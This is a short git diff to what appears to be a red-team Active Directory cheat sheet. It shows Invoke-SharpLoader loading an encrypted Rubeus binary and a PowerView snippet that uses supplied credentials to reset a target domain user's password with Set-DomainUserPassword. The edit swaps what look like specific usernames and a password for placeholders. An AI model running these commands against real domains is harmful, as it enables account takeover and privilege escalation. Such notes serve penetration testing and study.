@@ -27,12 +27,12 @@ Invoke-SharpLoader -location C:\EncryptedCSharp\Rubeus.enc -password S3cur3Th1sS
 ***
 ```powershell
 Import-Module .\PowerView.ps1
-$Username = 'p00_adm'
-$Password = 'ZQ!5t4r'
+$Username = 'administrator'
+$Password = 'peepeepoopoo'
 $pass = ConvertTo-SecureString -AsPlainText $Password -Force
 $Cred = New-Object System.Management.Automation.PSCredential -ArgumentList
 $Username,$pass
-Set-DomainUserPassword -Identity mr3ks -Password $pass -Credential $Cred
+Set-DomainUserPassword -Identity Domain_Admin_username -Password $pass -Credential $Cred
 ```
 ***
 
